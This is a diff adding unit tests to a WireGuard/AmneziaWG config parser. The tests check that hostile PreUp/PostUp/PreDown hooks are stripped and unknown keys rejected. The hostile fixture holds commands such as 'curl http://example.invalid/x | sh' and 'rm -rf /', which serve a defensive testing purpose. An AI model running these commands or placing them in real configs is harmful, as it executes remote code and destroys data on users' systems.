@@ -1036,6 +1036,77 @@ class AllowedNetworksTests(unittest.TestCase):
         )
 
 
+class UpstreamConfigSafetyTests(unittest.TestCase):
+    hostile = (
+        "[Interface]\n"
+        "Address = 10.90.0.2/30\n"
+        "PrivateKey = priv\n"
+        "PreUp = touch /tmp/pwned\n"
+        "POSTUP = curl http://example.invalid/x | sh\n"
+        "PreDown = rm -rf /\n"
+        "PostDown = id\n"
+        "SaveConfig = true\n"
+        "\n"
+        "[Peer]\n"
+        "PublicKey = pub\n"
+        "Endpoint = host:51820\n"
+        "AllowedIPs = 0.0.0.0/0\n"
+    )
+
+    def test_hooks_never_reach_the_generated_config(self):
+        text = awgconf.render(self.hostile, 1380)
+        for token in ("preup", "postup", "predown", "postdown", "saveconfig",
+                      "pwned", "curl", "rm -rf"):
+            self.assertNotIn(token, text.lower())
+
+    def test_hooks_do_not_make_a_config_invalid(self):
+        # They are expected in provider configs; the parser strips them.
+        self.assertEqual(awgconf.validate(self.hostile), [])
+
+    def test_obfuscation_parameters_survive(self):
+        conf = (
+            "[Interface]\n"
+            "Address = 10.90.0.2/30\n"
+            "PrivateKey = priv\n"
+            "Jc = 4\nJmin = 40\nJmax = 70\n"
+            "S1 = 50\nS2 = 100\nS3 = 20\nS4 = 30\n"
+            "H1 = 111\nH2 = 222\nH3 = 333\nH4 = 444\n"
+            "I1 = <b 0x0001>\n"
+            "HeaderProtectionKey = a2V5\n"
+            "ContentPaddingAddition = 16\n"
+            "RandomTrailers = on\n"
+            "DisableCookies = on\n"
+            "RekeyTimeout = 5\n"
+            "RekeyAfterTime = 120\n"
+            "RejectAfterTime = 180\n"
+            "KeepaliveTimeout = 10\n"
+            "MaxHandshakeAttempts = 18\n"
+            "\n[Peer]\nPublicKey = pub\nEndpoint = host:51820\n"
+        )
+        self.assertEqual(awgconf.validate(conf), [])
+        text = awgconf.render(conf, 1380)
+        for key in ("Jc", "Jmin", "Jmax", "S1", "S4", "H1", "H4", "I1",
+                    "HeaderProtectionKey", "ContentPaddingAddition",
+                    "RandomTrailers", "DisableCookies", "RekeyTimeout",
+                    "RekeyAfterTime", "RejectAfterTime", "KeepaliveTimeout",
+                    "MaxHandshakeAttempts"):
+            self.assertIn(key, text)
+
+    def test_an_unknown_interface_key_is_refused(self):
+        conf = self.hostile.replace(
+            "SaveConfig = true", "FancyHook = something"
+        )
+        errors = awgconf.validate(conf)
+        self.assertTrue(any("unsupported in [Interface]" in e for e in errors))
+        self.assertTrue(any("FancyHook" in e for e in errors))
+
+    def test_an_unknown_interface_key_is_not_rendered(self):
+        conf = self.hostile.replace(
+            "SaveConfig = true", "FancyHook = something"
+        )
+        self.assertNotIn("FancyHook", awgconf.render(conf, 1380))
+
+
 class NatTests(unittest.TestCase):
     def exit(self, iface, mode="internet", nat=1, enabled=1):
         return {"iface": iface, "mode": mode, "nat": nat, "enabled": enabled}
